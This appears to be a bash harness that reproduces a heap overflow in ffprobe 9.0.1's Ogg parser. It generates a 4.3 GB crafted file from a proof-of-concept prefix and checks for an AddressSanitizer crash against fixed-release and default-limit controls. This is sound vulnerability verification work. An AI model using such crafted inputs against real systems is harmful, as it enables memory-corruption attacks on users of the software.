#!/usr/bin/env bash
set -euo pipefail
ulimit -c 0
: > /output/reproduction.txt
: > /output/controls.txt

for version in 9.0.1 9.0.2; do
    version_line="$("/opt/ffprobe-${version}" -version)"
    version_line="${version_line%%$'\n'*}"
    case "$version_line" in
        "ffprobe version ${version} "*) printf '%s\n' "$version_line" >> /output/reproduction.txt ;;
        *) printf '[runner] unexpected release: %s\n' "$version_line" >&2; exit 1 ;;
    esac
done

input=/data/continued-4g.ogg
expected=1931adaa1a215bafabb99108c623cb76d750e87d7296fe4fbe08852081ee06dd
timeout 300s /opt/make-ogg-overflow /poc/input/poc-prefix.ogg "$input" > /data/generation.txt
cmp -n 91 /poc/input/poc-prefix.ogg "$input"
actual="$(timeout 120s sha256sum "$input" | cut -d' ' -f1)"
cat /data/generation.txt >> /output/reproduction.txt
printf 'sha256=%s\n' "$actual" >> /output/reproduction.txt
test "$actual" = "$expected"
test "$(stat -c %s "$input")" = 4310262091
grep -q '^logical_size=4310262091 pages=66002$' /data/generation.txt
echo '[runner] payload byte and size checks passed' >> /output/reproduction.txt

run_case() {
    local name="$1" version="$2" allocation="$3" log="$4" status
    local -a cmd=("/opt/ffprobe-${version}" -hide_banner -v error)
    if [ "$allocation" = raised ]; then
        cmd+=(-max_alloc 8589934592)
    fi
    cmd+=(-f ogg -show_packets "$input")
    set +e
    timeout 300s env \
        ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:allocator_may_return_null=1 \
        UBSAN_OPTIONS=halt_on_error=1:print_stacktrace=1 \
        "${cmd[@]}" > "/data/${name}.stdout" 2> "/data/${name}.stderr"
    status=$?
    set -e
    printf '%s\n' "$status" > "/data/${name}.exit"
    {
        printf '$ '
        printf '%q ' "${cmd[@]}"
        printf '\n[runner] exit status: %s\n[stderr]\n' "$status"
        cat "/data/${name}.stderr"
    } >> "$log"
    test ! -s "/data/${name}.stdout"
    printf '[runner] %s exit status: %s\n' "$name" "$status"
}

: > /output/vulnerable-9.0.1.txt
: > /output/fixed-9.0.2.txt
run_case vulnerable-9.0.1 9.0.1 raised /output/vulnerable-9.0.1.txt
run_case fixed-9.0.2 9.0.2 raised /output/fixed-9.0.2.txt
run_case default-limit-control-9.0.1 9.0.1 default /output/controls.txt
run_case default-limit-control-9.0.2 9.0.2 default /output/controls.txt

test "$(cat /data/vulnerable-9.0.1.exit)" = 134
grep -q 'ERROR: AddressSanitizer: unknown-crash' /data/vulnerable-9.0.1.stderr
grep -q 'WRITE of size 31895' /data/vulnerable-9.0.1.stderr
grep -q 'in ogg_read_page' /data/vulnerable-9.0.1.stderr
test "$(cat /data/fixed-9.0.2.exit)" = 1
grep -q 'Cannot allocate memory' /data/fixed-9.0.2.stderr
! grep -Eq 'AddressSanitizer|runtime error:' /data/fixed-9.0.2.stderr
test "$(cat /data/default-limit-control-9.0.1.exit)" = 1
grep -q 'Cannot allocate memory' /data/default-limit-control-9.0.1.stderr
! grep -Eq 'AddressSanitizer|runtime error:' /data/default-limit-control-9.0.1.stderr
test "$(cat /data/default-limit-control-9.0.2.exit)" = 1
grep -q 'Cannot allocate memory' /data/default-limit-control-9.0.2.stderr
! grep -Eq 'AddressSanitizer|runtime error:' /data/default-limit-control-9.0.2.stderr
echo '[runner] all release and control assertions passed' | tee -a /output/reproduction.txt
